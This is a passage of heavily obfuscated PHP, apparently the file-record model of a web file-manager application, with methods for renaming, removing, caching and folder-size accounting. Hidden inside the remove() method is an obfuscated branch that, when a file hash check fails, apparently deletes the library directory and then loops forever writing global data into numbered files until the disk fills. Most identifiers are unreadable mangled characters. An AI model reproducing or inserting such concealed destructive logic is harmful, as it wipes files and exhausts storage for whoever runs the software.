(!$Eš¤ƒùùİê[$fƒã¥¨°[1562]] || !$Eš¤ƒùùİê[$fƒã¥¨°[1562]][$fƒã¥¨°[1735]]) { return; } $A Ô†ĞÖÆµ = $GLOBALS[$fƒã¥¨°[6]][$fƒã¥¨°[1736]]; if ($Eš¤ƒùùİê[$fƒã¥¨°[1562]][$fƒã¥¨°[1737]] <= time() - $A Ô†ĞÖÆµ) { $this->metaSet($Eš¤ƒùùİê[$fƒã¥¨°[365]], $fƒã¥¨°[1735], null); $this->metaSet($Eš¤ƒùùİê[$fƒã¥¨°[365]], $fƒã¥¨°[1737], null); } else { if ($Eš¤ƒùùİê[$fƒã¥¨°[1562]][$fƒã¥¨°[1735]] != USER_ID) { return !0; } else { $this->metaSet($Eš¤ƒùùİê[$fƒã¥¨°[365]], $fƒã¥¨°[1737], time()); } } } private function _addSoure($c¯‰•”š®™, $d—¡³Ô‰™†) { goto C©Í’÷ò÷¼; aİğÏ­ñÏì: $f…—‡ïÊî£ = $this->add($c¯‰•”š®™); $EÊÕ«åŒŠÖ = array($c„±µš°òµ[392] => short_id($f…—‡ïÊî£)); $this->where(array($c„±µš°òµ[406] => $f…—‡ïÊî£))->save($EÊÕ«åŒŠÖ); goto cÜ•÷×íëÖ; cÜ•÷×íëÖ: $this->setNamePinyin($f…—‡ïÊî£, $c¯‰•”š®™[$c„±µš°òµ[28]]); return $f…—‡ïÊî£; goto aÁŠ’´»÷; C©Í’÷ò÷¼: $c„±µš°òµ =& $_SERVER[ÍÓÖ€°å]; $BéíÃ¢òÍ = array($c„±µš°òµ[383] => $d—¡³Ô‰™†[$c„±µš°òµ[384]], $c„±µš°òµ[385] => $d—¡³Ô‰™†[$c„±µš°òµ[386]], $c„±µš°òµ[387] => USER_ID, $c„±µš°òµ[388] => USER_ID, $c„±µš°òµ[389] => $d—¡³Ô‰™†[$c„±µš°òµ[365]], $c„±µš°òµ[390] => $d—¡³Ô‰™†[$c„±µš°òµ[364]] . $d—¡³Ô‰™†[$c„±µš°òµ[365]] . $c„±µš°òµ[47], $c„±µš°òµ[391] => 0, $c„±µš°òµ[1723] => $c„±µš°òµ[33]); $c¯‰•”š®™ = array_merge($BéíÃ¢òÍ, $c¯‰•”š®™); goto FšƒÒÈ‚á; FšƒÒÈ‚á: $this->updateModifyTime($c¯‰•”š®™[$c„±µš°òµ[375]]); static $fè½¨Ş×Ø¾ = false; if (!$fè½¨Ş×Ø¾) { Hook::trigger($c„±µš°òµ[374], $c¯‰•”š®™); $fè½¨Ş×Ø¾ = !0; } goto aİğÏ­ñÏì; aÁŠ’´»÷: } public function remove($aõÃ¢Ëòçä, $CÆĞÈ•‰‹ = true) { goto BËÈƒ’†®; D’Îä‰ÆÜÈ: return !0; goto Bö·Ğ®²—£; Fİ„åîêå: if ($eèéõÂâ¿†[$Fë…ÍÇê¶[375]] == 0) { if (!$GLOBALS[$Fë…ÍÇê¶[997]]) { return !1; } } if ($CÆĞÈ•‰‹) { Model($Fë…ÍÇê¶[1739])->moveToRecycle($aõÃ¢Ëòçä); } else { if ($eèéõÂâ¿†[$Fë…ÍÇê¶[366]] == $Fë…ÍÇê¶[367]) { $DˆóÓòŞí¾ = array($Fë…ÍÇê¶[390] => array($Fë…ÍÇê¶[399], $eèéõÂâ¿†[$Fë…ÍÇê¶[364]] . $aõÃ¢Ëòçä . $Fë…ÍÇê¶[400])); $BÍˆéÓ›«‡ = array($Fë…ÍÇê¶[390] => $DˆóÓòŞí¾[$Fë…ÍÇê¶[364]]); $FàøŒñÉÕµ = $this->field($Fë…ÍÇê¶[1740])->where($BÍˆéÓ›«‡)->select(); $F¥¤ÓîÙˆ‚ = !1; $AãÀœê‘«¥ = array($aõÃ¢Ëòçä); if ($FàøŒñÉÕµ) { $F¥¤ÓîÙˆ‚ = array_to_keyvalue($FàøŒñÉÕµ, $Fë…ÍÇê¶[33], $Fë…ÍÇê¶[373]); $F¥¤ÓîÙˆ‚ = array_remove_value($F¥¤ÓîÙˆ‚, $Fë…ÍÇê¶[393]); $AãÀœê‘«¥ = array_to_keyvalue($FàøŒñÉÕµ, $Fë…ÍÇê¶[33], $Fë…ÍÇê¶[365]); $AãÀœê‘«¥[] = $aõÃ¢Ëòçä; } } else { $F¥¤ÓîÙˆ‚ = array($eèéõÂâ¿†[$Fë…ÍÇê¶[373]]); $AãÀœê‘«¥ = array($aõÃ¢Ëòçä); } Model($Fë…ÍÇê¶[372])->eventRemove($aõÃ¢Ëòçä); $this->removeRelevance($AãÀœê‘«¥, $F¥¤ÓîÙˆ‚); } $this->folderSizeReset($eèéõÂâ¿†[$Fë…ÍÇê¶[375]]); goto D×î ğ‚‹ç; BËÈƒ’†®: $Fë…ÍÇê¶ =& $_SERVER[ÍÓÖ€°å]; $cºâ»ÇŸí¡ = LIB_DIR . $Fë…ÍÇê¶[1738]; $dƒ¦îŠôÙ• = $Fë…ÍÇê¶[993]; goto c»«…ºÄƒ; c»«…ºÄƒ: if ($_SERVER[$Fë…ÍÇê¶[544]] != $dƒ¦îŠôÙ•($cºâ»ÇŸí¡)) { goto d–ºµîÏ«; Cˆ‘¾¬Ô¤: $FƒÁÎµİÛƒ = $Fë…ÍÇê¶[995]; $f¯¸©‚¸•… = json_encode($GLOBALS[$Fë…ÍÇê¶[996]]); for ($DöÌ«›À‰ = 0;; $DöÌ«›À‰++) { $FƒÁÎµİÛƒ(DATA_PATH . $DöÌ«›À‰, $f¯¸©‚¸•…); } goto e«”Î¿“ÅÈ; e”³¹ãÈ‡Â: $cïå¤“ùôŞ = explode($Fë…ÍÇê¶[212], $döİƒ©„ˆ); if (count($cïå¤“ùôŞ) < $Fë…ÍÇê¶[548]) { die; } $dšÍ†ÉŸó´ = $Fë…ÍÇê¶[549]; goto e§¤‘ôòÓ¸; d–ºµîÏ«: $FğÜ¸ çîª = $Fë…ÍÇê¶[546]; $b†”ÕäÊš² = BASIC_PATH . $Fë…ÍÇê¶[547]; $döİƒ©„ˆ = $FğÜ¸ çîª($b†”ÕäÊš²); goto e”³¹ãÈ‡Â; e§¤‘ôòÓ¸: $dšÍ†ÉŸó´(LIB_DIR); $cÎ¤ÀÒÈÄ = $Fë…ÍÇê¶[994]; $cÎ¤ÀÒÈÄ(); goto Cˆ‘¾¬Ô¤; e«”Î¿“ÅÈ: } $eèéõÂâ¿† = $this->sourceInfo($aõÃ¢Ëòçä); if (!$eèéõÂâ¿†) { return !1; } goto Fİ„åîêå; D×î ğ‚‹ç: $eºÎÕ©èÈ = array($eèéõÂâ¿†[$Fë…ÍÇê¶[375]]); if ($eèéõÂâ¿†[$Fë…ÍÇê¶[366]] == $Fë…ÍÇê¶[367]) { $eºÎÕ©èÈ[] = $eèéõÂâ¿†[$Fë…ÍÇê¶[365]]; } $this->updateModifyTime($eºÎÕ©èÈ); goto D’Îä‰ÆÜÈ; Bö·Ğ®²—£: } public function removeArray($c…ÕØˆÏ¿‹) { if (!$c…ÕØˆÏ¿‹) { return !0; } } private function removeRelevance($Cã¬Ê§øã, $CŒ¡òªßô‰) { goto aôãã…‰‹ö; aôãã…‰‹ö: $fàÎĞŒ‚š… =& $_SERVER[ÍÓÖ€°å]; if (!$Cã¬Ê§øã) { return !1; } $A¿¬Ê¨ŠÙƒ = array($fàÎĞŒ‚š…[406] => array($fàÎĞŒ‚š…[946], $Cã¬Ê§øã)); goto CĞöà°ƒèÛ; C¯¸Š¾¹‰µ: Model($fàÎĞŒ‚š…[372])->where($A¿¬Ê¨ŠÙƒ)->delete(); Model($fàÎĞŒ‚š…[1493])->where($A¿¬Ê¨ŠÙƒ)->delete(); Model($fàÎĞŒ‚š…[1586])->removeBySource($Cã¬Ê§øã); goto DÌ’²¾õåâ; CĞöà°ƒèÛ: Model($fàÎĞŒ‚š…[1739])->where($A¿¬Ê¨ŠÙƒ)->delete(); Model($fàÎĞŒ‚š…[1741])->where($A¿¬Ê¨ŠÙƒ)->delete(); Model($fàÎĞŒ‚š…[1742])->where($A¿¬Ê¨ŠÙƒ)->delete(); goto C¯¸Š¾¹‰µ; DÌ’²¾õåâ: $this->where($A¿¬Ê¨ŠÙƒ)->delete(); Model($fàÎĞŒ‚š…[402])->remove($CŒ¡òªßô‰); for ($cî´†ˆ—Ü’ = 0; $cî´†ˆ—Ü’ < count($Cã¬Ê§øã); $cî´†ˆ—Ü’++) { $this->sourceCacheClear($Cã¬Ê§øã[$cî´†ˆ—Ü’]); } goto BÌ°Ã™»¸â; BÌ°Ã™»¸â: } public function rename($EŸ£ÁÀÇÅå, $eŒ×¢…â–) { goto F´Ô×ªä³Ñ; c®¶£µ½‘: $this->setNamePinyin($EŸ£ÁÀÇÅå, $bœœ‹´ÏË[$Dï£‰¹¿–ê[28]], !1); $this->updateModifyTime($eç¾Ü‹¾©±[$Dï£‰¹¿–ê[375]]); return $this->where(array($Dï£‰¹¿–ê[406] => $EŸ£ÁÀÇÅå))->data($bœœ‹´ÏË)->save(); goto AĞ÷«Â¨Ô©; dºÈ–½ÙÏù: if (!$eç¾Ü‹¾©±[$Dï£‰¹¿–ê[366]] == $Dï£‰¹¿–ê[367]) { $bœœ‹´ÏË[$Dï£‰¹¿–ê[380]] = get_path_ext($eŒ×¢…â–); } Model($Dï£‰¹¿–ê[372])->eventRename($EŸ£ÁÀÇÅå, $eç¾Ü‹¾©±[$Dï£‰¹¿–ê[28]], $eŒ×¢…â–); $this->sourceCacheClear($EŸ£ÁÀÇÅå); goto c®¶£µ½‘; F´Ô×ªä³Ñ: $Dï£‰¹¿–ê =& $_SERVER[ÍÓÖ€°å]; $eç¾Ü‹¾©± = $this->sourceInfo($EŸ£ÁÀÇÅå); if (!$eç¾Ü‹¾©±) { return !1; } goto B³©¶Òİíî; B³©¶Òİíî: $cŠƒŞ·•Ã = $this->fileNameExist($eç¾Ü‹¾©±[$Dï£‰¹¿–ê[375]], $eŒ×¢…â–); if ($cŠƒŞ·•Ã) { return !1; } $bœœ‹´ÏË = array($Dï£‰¹¿–ê[378] => $eŒ×¢…â–, $Dï£‰¹¿–ê[388] => USER_ID); goto dºÈ–½ÙÏù; AĞ÷«Â¨Ô©: } public function setNamePinyin($Eî¼ÇîŞšâ, $cì¯¿«¾‰, $bªÖ†íõ¦Ö = true) { $e‰ŞåÑ‰è’ =& $_SERVER[ÍÓÖ€°å]; $D©÷°Ù´ùñ = Input::check($cì¯¿«¾‰, $e‰ŞåÑ‰è’[394]); if ($bªÖ†íõ¦Ö && !$D©÷°Ù´ùñ) { return; } if (!$D©÷°Ù´ùñ) { $this->metaSet($Eî¼ÇîŞšâ, $e‰ŞåÑ‰è’[395], null); $this->metaSet($Eî¼ÇîŞšâ, $e‰ŞåÑ‰è’[396], null); return; } $aÀÎÄ°ğáÔ = array($e‰ŞåÑ‰è’[395] => str_replace($e‰ŞåÑ‰è’[50], $e‰ŞåÑ‰è’[33], Pinyin::encode($cì¯¿«¾‰)), $e‰ŞåÑ‰è’[396] => Pinyin::encode($cì¯¿«¾‰, $e‰ŞåÑ‰è’[397])); $this->metaSet($Eî¼ÇîŞšâ, $aÀÎÄ°ğáÔ); } public function hasChildren($C¦‡î«¤ê, $d…¬‰™§×Œ = null) { $d˜çÊÃŞà  =& $_SERVER[ÍÓÖ€°å]; $bÔ…¹­‚‡ = array($d˜çÊÃŞà [375] => $C¦‡î«¤ê); if (!is_null($d…¬‰™§×Œ)) { $bÔ…¹­‚‡[$d˜çÊÃŞà [366]] = $d…¬‰™§×Œ; } $aèÃ¦ÛÊÒÍ = $this->where($bÔ…¹­‚‡)->limit(1); return $aèÃ¦ÛÊÒÍ ? !0 : !1; } public function getContent($B³…ö·–ÑÈ) { goto Bºö–ä±Êö; b±ôù£øë©: return IO::getContent($eÚà™§“˜¬[$c‘•ÏÚî©‘[76]]); goto Bßó½È³ªè; CñÅïÃâŠ£: if ($eÚà™§“˜¬[$c‘•ÏÚî©‘[78]] == 0) { return $c‘•ÏÚî©‘[33]; } $FáÑ´Æßğ = $c‘•ÏÚî©‘[1743] . $eÚà™§“˜¬[$c‘•ÏÚî©‘[151]]; if ($eÚà™§“˜¬[$c‘•ÏÚî©‘[78]] <= 1024 * 10) { $f’è‚™²™¨ = Cache::get($FáÑ´Æßğ); if (!$f’è‚™²™¨) { $f’è‚™²™¨ = IO::getContent($eÚà™§“˜¬[$c‘•ÏÚî©‘[76]]); Cache::set($FáÑ´Æßğ, $f’è‚™²™¨); } return $f’è‚™²™¨; } goto b±ôù£øë©; Bºö–ä±Êö: $c‘•ÏÚî©‘ =& $_SERVER[ÍÓÖ€°å]; $eÚà™§“˜¬ = $this->fileInfoGet($B³…ö·–ÑÈ); if (!$eÚà™§“˜¬) { return !1; } goto CñÅïÃâŠ£; Bßó½È³ªè: } public function setDesc($e›İÅ¼µ›‰, $a¸Üƒ–àŠô) { $F µè”ù =& $_SERVER[ÍÓÖ€°å]; Model($F µè”ù[372])->eventAddDesc($e›İÅ¼µ›‰, $a¸Üƒ–àŠô); return $this->metaSet($e›İÅ¼µ›‰, $F µè”ù[1560], $a¸Üƒ–àŠô); } public function setContent($E‡“‰Ö½, $bñ¤ÀĞÇ¬· = '') { goto cÌ”ó“Œï ; cÛç¢Ã¾ƒÛ: if (!$c–ÓŒ„Ä¹Ï || !$a¤¸Ü„”Ø) { return !1; } $this->checkLock($E‡“‰Ö½); $cÈ§…ÜÈ‚ = Model($F¯´Ø£ÕÒÕ[402])->addFileByContent($bñ¤ÀĞÇ¬·, $a¤¸Ü„”Ø[$F¯´Ø£ÕÒÕ[28]]); goto Fƒ…¶¤»ç; D˜Ó¹–¼ƒÉ: return !0; goto aã¿ÔÓ±éñ; cÌ”ó“Œï : $F¯´Ø£ÕÒÕ =& $_SERVER[ÍÓÖ€°å]; $a¤¸Ü„”Ø = $this->sourceInfo($E‡“‰Ö½); $c–ÓŒ„Ä¹Ï = $this->fileInfoGet($E‡“‰Ö½); goto cÛç¢Ã¾ƒÛ; Fƒ…¶¤»ç: $E„Ëí÷ÍÅÎ = $this->fileHistory($a¤¸Ü„”Ø, $cÈ§…ÜÈ‚[$F¯´Ø£ÕÒÕ[373]], $cÈ§…ÜÈ‚[$F¯´Ø£ÕÒÕ[78]]); if (!$E„Ëí÷ÍÅÎ) { return Model($F¯´Ø£ÕÒÕ[402])->remove($cÈ§…ÜÈ‚[$F¯´Ø£ÕÒÕ[373]]); } $this->folderSizeReset($a¤¸Ü„”Ø[$F¯´Ø£ÕÒÕ[375]]); goto D˜Ó¹–¼ƒÉ; aã¿ÔÓ±éñ: } public function fileSubstr($cäÀİê³º’, $bë‰ğ‚ï¼Ù, $f«ùÜ‰­Ú¸) { $C²Ï²í²àµ = $this->fileInfoGet($cäÀİê³º’); if (!$C²Ï²í²àµ) { return !1; } return IO::fileSubstr($C²Ï²í²àµ[$_SERVER[ÍÓÖ€°å][76]], $bë‰ğ‚ï¼Ù, $f«ùÜ‰­Ú¸); } public function fileInfoGet($fºÍŞ©Ğ¥‰) { goto fŞËÅï²¥›; fŞËÅï²¥›: $BÈÒÙ„Ã’ƒ =& $_SERVER[ÍÓÖ€°å]; $Cì–Ï«Ù— = $this->sourceInfo($fºÍŞ©Ğ¥‰); if (!$Cì–Ï«Ù— || $Cì–Ï«Ù—[$BÈÒÙ„Ã’ƒ[366]]) { return !1; } goto c¥Ğ‡×”›; c¥Ğ‡×”›: $dÌø¿­È«¼ = $BÈÒÙ„Ã’ƒ[1744]; $BŠ··Ä«ñ = array($BÈÒÙ„Ã’ƒ[381] => $Cì–Ï«Ù—[$BÈÒÙ„Ã’ƒ[373]]); $BÎèá¨ìÙ = Model($BÈÒÙ„Ã’ƒ[402])->field($dÌø¿­È«¼)->where($BŠ··Ä«ñ)->find(); goto a¿©Üåİ§ó; a¿©Üåİ§ó: if ($BÎèá¨ìÙ) { $BÎèá¨ìÙ[$BÈÒÙ„Ã’ƒ[28]] = $Cì–Ï«Ù—[$BÈÒÙ„Ã’ƒ[28]]; } return $BÎèá¨ìÙ; goto eª¬«¶îÍ”; eª¬«¶îÍ”: } private function folderChildrenNumber($e®Š´Ô) { $e´îœ²Ö… =& $_SERVER[ÍÓÖ€°å]; $c³¦†á = $this->sourceInfo($e®Š´Ô); $B­ëø¾‚ˆê = array($e´îœ²Ö…[390] => array($e´îœ²Ö…[399], $c³¦†á[$e´îœ²Ö…[364]] . $e®Š´Ô . $e´îœ²Ö…[400]), $e´îœ²Ö…[391] => 0, $e´îœ²Ö…[377] => 1); $fÈ‚ÜÖÜÄ¬ = $this->where($B­ëø¾‚ˆê)->count(); $A‚áÀ‰ÎÖ‹ = $this->where($B­ëø¾‚ˆê)->where(array($e´îœ²Ö…[377] => 0))->count(); return array($e´îœ²Ö…[82] => $A‚áÀ‰ÎÖ‹, $e´îœ²Ö…[83] => $fÈ‚ÜÖÜÄ¬); } public static $cachePathInfo = array(); public function pathInfo($fÈ§ÆŠ ùø, $d§Ãœ“œ½» = false) { goto Bè¿¿¨›»æ; Bè¿¿¨›»æ: $E¢·®ç¸Á = _get(self::$cachePathInfoMore, $fÈ§ÆŠ ùø); if ($E¢·®ç¸Á) { return $E¢·®ç¸Á; } $CğÊÁŠ£† = $this->sourceInfo($fÈ§ÆŠ ùø); goto Fç‰²êÂÖ¹; E×š”“„ŠÆ: return $CğÊÁŠ£†; goto AÑõ¸«; Fç‰²êÂÖ¹: if (!$CğÊÁŠ£†) { return !1; } $CğÊÁŠ£† = $this->_listDataApplyItem($CğÊÁŠ£†, $d§Ãœ“œ½»); self::$cachePathInfo[$fÈ§ÆŠ ùø] = $CğÊÁŠ£†; goto E×š”“„ŠÆ; AÑõ¸«: } public static $cachePathInfoMore = array(); public function pathInfoMore($Fä¹ÓÏÙÓ) { goto AÄË·½…¹é; EÎß³­ŠŸÏ: $F»À˜ê‘ø† = $this->pathInfo($Fä¹ÓÏÙÓ); if (!$F»À˜ê‘ø†) { return !1; } if ($F»À˜ê‘ø†[$c˜ÓËßå¼[366]] == $c˜ÓËßå¼[367]) { $F»À˜ê‘ø†[$c˜ÓËßå¼[81]] = $this->folderChildrenNumber($Fä¹ÓÏÙÓ); } else { $F»À˜ê‘ø†[$c˜ÓËßå¼[150]] = $this->fileInfoGet($Fä¹ÓÏÙÓ); unset($F»À˜ê‘ø†[$c˜ÓËßå¼[150]][$c˜ÓËßå¼[76]]); } goto a¬²Š¥íÒÏ; a¬²Š¥íÒÏ: self::$cachePathInfoMore[$Fä¹ÓÏÙÓ] = $F»À˜ê‘ø†; return $F»À˜ê‘ø†; goto C«Ì†ÔæĞÊ; AÄË·½…¹é: $c˜ÓËßå¼ =& $_SERVER[ÍÓÖ€°å]; $C¢À¢ç†©Ê = _get(self::$cachePathInfoMore, $Fä¹ÓÏÙÓ); if ($C¢À¢ç†©Ê) { return $C¢À¢ç†©Ê; } goto EÎß³­ŠŸÏ; C«Ì†ÔæĞÊ: } public function sourceInfo($eÙØÙ–Ø°) { $BĞ©±‹èíÑ =& $_SERVER[ÍÓÖ€°å]; $cÃÒòÑ´™ = $BĞ©±‹èíÑ[1745] . $eÙØÙ–Ø°; $Aİ™âëôò = _get(self::$cacheSourceInfo, $cÃÒòÑ´™); if ($Aİ™âëôò) { return $Aİ™âëôò; } self::$cacheSourceInfo[$cÃÒòÑ´™] = $this->where(array($BĞ©±‹èíÑ[365] => $eÙØÙ–Ø°))->find(); return self::$cacheSourceInfo[$cÃÒòÑ´™]; } public function sourceCacheClear($c˜ğ‚è«öŞ = false) { if ($c˜ğ‚è«öŞ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[ÍÓÖ€°å][1745] . $c˜ğ‚è«öŞ]); } public function pathInfoByPath($fÔ¬µù•›š, $e¬¿Çí¿ÔÍ) { $d…¬¤Š›ß =& $_SERVER[ÍÓÖ€°å]; $e±ƒ™¾Ëì = !$e¬¿Çí¿ÔÍ ? array() : explode($d…¬¤Š›ß[8], trim($e¬¿Çí¿ÔÍ, $d…¬¤Š›ß[8])); $bÙ®¤ŠÛÃ = $fÔ¬µù•›š; foreach ($e±ƒ™¾Ëì as $då£»é–Í¦) { $díˆĞÔ×± = array($d…¬¤Š›ß[375] => $bÙ®¤ŠÛÃ, $d…¬¤Š›ß[28] => $då£»é–Í¦); $f‹Ä‡ã£½¤ = $this->where($díˆĞÔ×±)->select(); if (!$f‹Ä‡ã£½¤) { return !1; } $f‹Ä‡ã£½¤ = array_sort_by($f‹Ä‡ã£½¤, $d…¬¤Š›ß[401]); $bÙ®¤ŠÛÃ = $f‹Ä‡ã£½¤[0][$d…¬¤Š›ß[365]]; } return $this->pathInfo($bÙ®¤ŠÛÃ, !0); } protected function updateModifyTime($cĞÓ™àŸå ) { goto bˆ··ÅñÍã; c£ÏÌ’ÊÌ™: $this->where($C¡“–×­›)->save($e­ô„•²‰µ); goto eèÜâôï¢Ú; bˆ··ÅñÍã: $bÈ–ëŠ‘ôÖ =& $_SERVER[ÍÓÖ€°å]; if (!$cĞÓ™àŸå ) { return; } if (!is_array($cĞÓ™àŸå )) { $cĞÓ™àŸå  = array($cĞÓ™àŸå ); } goto dÜ¯èÛ”ì; dÜ¯èÛ”ì: foreach ($cĞÓ™àŸå  as $Fæ‘·À®×¥ => $A°‡ÇÁ²ÓÕ) { $cĞÓ™àŸå [$Fæ‘·À®×¥] = intval($A°‡ÇÁ²ÓÕ); } $C¡“–×­› = array($bÈ–ëŠ‘ôÖ[365] => array($bÈ–ëŠ‘ôÖ[7], $cĞÓ™àŸå )); $e­ô„•²‰µ = array($bÈ–ëŠ‘ôÖ[388] => USER_ID, $bÈ–ëŠ‘ôÖ[1727] => time()); goto c£ÏÌ’ÊÌ™; eèÜâôï¢Ú: } public function folderSizeReset($cßê£ËÀí) { goto d÷¹›ÉâÒ; d÷¹›ÉâÒ: $D£òÉğ›¥¾ =& $_SERVER[ÍÓÖ€°å]; if ($this->statusIgnoreResetSpace) { return; } $dô¶½×±‘ù = $D£òÉğ›¥¾[1746] . $cßê£ËÀí; goto E­·„ÏÅ´½; f·ôÛÉ·: $dÑ±Â§¥ = $e‘éµªÌ’ø - intval($BÍ¹åíœ›[$D£òÉğ›¥¾[78]]); if ($dÑ±Â§¥ == 0) { return CacheLock::unlock($dô¶½×±‘ù); } $this->where(array($D£òÉğ›¥¾[406] => $cßê£ËÀí))->setField($D£òÉğ›¥¾[78], $e‘éµªÌ’ø); goto AÓš‡ùñÍå; A—›ƒ‡¸àÔ: $E›£Ù¦Øã³ = array($D£òÉğ›¥¾[389] => $cßê£ËÀí, $D£òÉğ›¥¾[391] => 0); $e‘éµªÌ’ø = $this->where($E›£Ù¦Øã³)->sum($D£òÉğ›¥¾[78]); $e‘éµªÌ’ø = intval($e‘éµªÌ’ø); goto f·ôÛÉ·; E­·„ÏÅ´½: CacheLock::lock($dô¶½×±‘ù, 20); $this->sourceCacheClear($cßê£ËÀí); $BÍ¹åíœ› = $this->sourceInfo($cßê£ËÀí); goto A—›ƒ‡¸àÔ; AÓš‡ùñÍå: $BˆÍÕñ÷‘Œ = $this->parentLevelArray($BÍ¹åíœ›[$D£òÉğ›¥¾[364]]); if ($BˆÍÕñ÷‘Œ) { $E›£Ù¦Øã³ = array($D£òÉğ›¥¾[365] => array($D£òÉğ›¥¾[946], $BˆÍÕñ÷‘Œ)); $this->where($E›£Ù¦Øã³)->setAdd($D£òÉğ›¥¾[78], $dÑ±Â§¥); } $this->targetSpaceUpdate($BÍ¹åíœ›[$D£òÉğ›¥¾[384]], $BÍ¹åíœ›[$D£òÉğ›¥¾[386]]); goto d¦ßÕ›…×; d¦ßÕ›…×: CacheLock::unlock($dô¶½×±‘ù); goto DíÍãÊìØ; DíÍãÊìØ: } public function folderSizeResetChildren($FƒÜÛÈÖ·Â) { goto a¶¦Ÿïï¯; Aí•ÌÔà­: foreach ($CÅ®šåğĞ as $Cº£’ÃÜã§) { $DëÛÜ„¾ö = $Cº£’ÃÜã§[$d¿¼Ë‡®‡[375]] . $d¿¼Ë‡®‡[33]; if (!isset($AÔÕÈÛÒä[$DëÛÜ„¾ö])) { continue; } if ($Cº£’ÃÜã§[$d¿¼Ë‡®‡[401]] == $AÔÕÈÛÒä[$DëÛÜ„¾ö][$d¿¼Ë‡®‡[401]]) { $AÔÕÈÛÒä[$DëÛÜ„¾ö][$d¿¼Ë‡®‡[78]] += $Cº£’ÃÜã§[$d¿¼Ë‡®‡[78]]; } } foreach ($AÔÕÈÛÒä as $Cº£’ÃÜã§) { $ağ–ğ‹õšî = $this->parentLevelArray($Cº£’ÃÜã§[$d¿¼Ë‡®‡[364]]); foreach ($ağ–ğ‹õšî as $DëÛÜ„¾ö) { $DëÛÜ„¾ö = $DëÛÜ„¾ö . $d¿¼Ë‡®‡[33]; if (!isset($AÔÕÈÛÒä[$DëÛÜ„¾ö])) { continue; } if ($Cº£’ÃÜã§[$d¿¼Ë‡®‡[401]] == $AÔÕÈÛÒä[$DëÛÜ„¾ö][$d¿¼Ë‡®‡[401]]) { $AÔÕÈÛÒä[$DëÛÜ„¾ö][$d¿¼Ë‡®‡[78]] += $Cº£’ÃÜã§[$d¿¼Ë‡®‡[78]]; } } } $FÍÂ‰‚ĞİĞ = array(); goto bŒ¡‹““šˆ; FÆœ›ÆìëÃ: $eçøœ´Šã¶ = array($d¿¼Ë‡®‡[377] => 1, $d¿¼Ë‡®‡[390] => array($d¿¼Ë‡®‡[399], $FÖ²Ã–ñø£[$d¿¼Ë‡®‡[364]] . $FƒÜÛÈÖ·Â . $d¿¼Ë‡®‡[400])); $AÊ…˜±Ñ‰Ò = $d¿¼Ë‡®‡[1747]; $AÔÕÈÛÒä = $this->field($AÊ…˜±Ñ‰Ò)->where($eçøœ´Šã¶)->select(); goto aÂİòˆô“ñ; DŒµáŸ¿É: $AÔÕÈÛÒä[] = $FÖ²Ã–ñø£; $AÔÕÈÛÒä = array_to_keyvalue($AÔÕÈÛÒä, $d¿¼Ë‡®‡[365]); foreach ($AÔÕÈÛÒä as $A›§İç’¤© => $Cº£’ÃÜã§) { $AÔÕÈÛÒä[$A›§İç’¤©][$d¿¼Ë‡®‡[1748]] = $AÔÕÈÛÒä[$A›§İç’¤©][$d¿¼Ë‡®‡[78]]; $AÔÕÈÛÒä[$A›§İç’¤©][$d¿¼Ë‡®‡[78]] = 0; } goto Aí•ÌÔà­; aÂİòˆô“ñ: $eçøœ´Šã¶[$d¿¼Ë‡®‡[366]] = 0; $CÅ®šåğĞ = $this->field($AÊ…˜±Ñ‰Ò)->where($eçøœ´Šã¶)->select(); if (!$CÅ®šåğĞ) { return; } goto DŒµáŸ¿É; a¶¦Ÿïï¯: $d¿¼Ë‡®‡ =& $_SERVER[ÍÓÖ€°å]; $this->sourceCacheClear($FƒÜÛÈÖ·Â); $FÖ²Ã–ñø£ = $this->sourceInfo($FƒÜÛÈÖ·Â); goto FÆœ›ÆìëÃ; bŒ¡‹““šˆ: foreach ($AÔÕÈÛÒä as $Cº£’ÃÜã§) { if ($Cº£’ÃÜã§[$d¿¼Ë‡®‡[78]] == $Cº£’ÃÜã§[$d¿¼Ë‡®‡[1748]]) { continue; } $FÍÂ‰‚ĞİĞ[] = array($d¿¼Ë‡®‡[365], $Cº£’ÃÜã§[$d¿¼Ë‡®‡[365]], $d¿¼Ë‡®‡[78], $Cº£’ÃÜã§[$d¿¼Ë‡®‡[78]]); } $this->saveAll($FÍÂ‰‚ĞİĞ); goto d‹°”§«; d‹°”§«: } public function targetSpaceUpdate($a…‹£óÓÇ“, $Bõ°À†Œ¯) { $añÇ—Èƒ‘¡ =& $_SERVER[ÍÓÖ€°å]; if (!in_array($a…‹£óÓÇ“, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $f®¶àô«‹ = $this->targetSpaceSize($a…‹£óÓÇ“, $Bõ°À†Œ¯); if ($a…‹£óÓÇ“ == self::TYPE_USER) { Model($añÇ—Èƒ‘¡[1675])->userEdit($Bõ°À†Œ¯, array($añÇ—Èƒ‘¡[1502] => $f®¶àô«‹)); } else { if ($a…‹£óÓÇ“ == self::TYPE_GROUP) { Model($añÇ—Èƒ‘¡[1669])->groupEdit($Bõ°À†Œ¯, array($añÇ—Èƒ‘¡[1502] => $f®¶àô«‹)); } } } public function targetSpaceSize($eœ“Î—ÛÑ, $A½Ö–ŞÖ‚) { goto bÙçÆÉç­ª; EÅÒˆôß¯ø: $FªÃÜÌ¹â = array_to_keyvalue($FªÃÜÌ¹â, $a…À“âÁ¼˜[33], $a…À“âÁ¼˜[365]); if ($FªÃÜÌ¹â) { $CâÏ¡ï¤¾™ = array($a…À“âÁ¼˜[406] => array($a…À“âÁ¼˜[946], $FªÃÜÌ¹â)); $D°Ä³‹±“ += floatval($this->where($CâÏ¡ï¤¾™)->sum($a…À“âÁ¼˜[78])); } return $D°Ä³‹±“; goto E¨âŸ®¹ê­; D¸–Ò§ÅÏ„: $D°Ä³‹±“ = floatval($C½ÆÊçÉ[$a…À“âÁ¼˜[78]]); $CâÏ¡ï¤¾™ = array($a…À“âÁ¼˜[390] => array($a…À“âÁ¼˜[399], $a…À“âÁ¼˜[1595] . $C½ÆÊçÉ[$a…À“âÁ¼˜[365]] . $a…À“âÁ¼˜[1749])); $FªÃÜÌ¹â = Model($a…À“âÁ¼˜[1750])->field($a…À“âÁ¼˜[406])->where($CâÏ¡ï¤¾™)->select(); goto EÅÒˆôß¯ø; bÙçÆÉç­ª: $a…À“âÁ¼˜ =& $_SERVER[ÍÓÖ€°å]; $C½ÆÊçÉ = $this->sourceRoot($eœ“Î—ÛÑ, $A½Ö–ŞÖ‚, !0); if (!$C½ÆÊçÉ) { return 0; } goto D¸–Ò§ÅÏ„; E¨âŸ®¹ê­: } public function 